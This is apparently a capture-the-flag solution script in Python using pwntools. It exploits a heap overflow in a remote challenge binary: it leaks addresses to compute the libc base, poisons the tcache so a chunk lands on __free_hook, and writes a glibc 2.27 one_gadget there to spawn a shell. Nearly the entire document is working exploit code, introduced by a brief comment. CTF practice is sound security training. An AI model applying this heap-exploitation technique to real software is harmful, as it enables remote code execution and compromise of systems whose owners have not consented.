#!/usr/bin/env python3
from pwn import *

'''
If you looked at my cache_money solve, this is exploited in almost the same exact way, except in this case
we can only allocate 4 chunks at a time. we can allocate chunks of any size, and can write up to uhhh 64 bytes ?
into each chunk. in cache money we could only write 15. so in this case we have the ability to overflow from one chunk
into unallocated regions or just the next chunk. yet again, we poison the tcache so our chunk gets allocated to __free_hook,
where we use a one_gadget in glibc_2.27 to pop a shell. this one looks even worse than my cache money writeup
'''

context.log_level = "critical"

p = remote("0.cloud.chals.io", 10034)
p.recvuntil(b"Kernel Seed: ")
seed = p.recvline()[:-1]
print("[!] seed:", seed.decode())
p.recvuntil(b"Enter option:")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Delete flag
print("[+] DELETE FLAG")
p.sendline(b"4")
p.recv()
p.sendline(b"3")
p.recvuntil(b"Enter option: ")

# Delete flag
print("[+] DELETE FLAG")
p.sendline(b"4")
p.recv()
p.sendline(b"2")
p.recvuntil(b"Enter option: ")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Read flag
print("[+] READ FLAG")
p.sendline(b"3")
p.recv()
p.sendline(b"2")
p.recvuntil(b"\n\n")
leak = p.recvline()[:-1][::-1].hex()
p.recvuntil(b"Enter option: ")

m0 = int(leak,16) - 0x1070
rand = (int(seed, 16) ^ m0) + 0x97
libc = rand - 0x44390
__free_hook = libc + 0x3ed8e8
win = int(leak,16) - 0x111cf24
print("[+] leak:", leak)
print("[+] rand@@GLIBC:", hex(rand))
print("[+] libc_base:", hex(libc))

if not hex(libc).endswith("00"):
    p.kill()
    p.close()

# Delete flag
print("[+] DELETE FLAG")
p.sendline(b"4")
p.recv()
p.sendline(b"2")
p.recvuntil(b"Enter option: ")

# Edit flag
print("[+] EDIT FLAG")
p.sendline(b"2")
p.recv()
p.sendline(b"1")
p.recv()
p.send((b"\x00" * 24) + (b"\x21") + (b"\x00" * 7) + p64(__free_hook))
p.recvuntil(b"Enter option: ")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Create flag
print("[+] CREATE FLAG")
p.sendline(b"1")
p.recv()
p.sendline(b"16")
p.recvuntil(b"Enter option: ")

# Edit flag
print("[+] EDIT FLAG")
p.sendline(b"2")
p.recv()
p.sendline(b"3")
p.recv()
p.send(p64(libc + 0x4f302))
p.recvuntil(b"Enter option: ")

# Delete flag
print("[+] DELETE FLAG")
p.sendline(b"4")
p.recv()
p.sendline(b"2")
p.recv()
p.interactive()
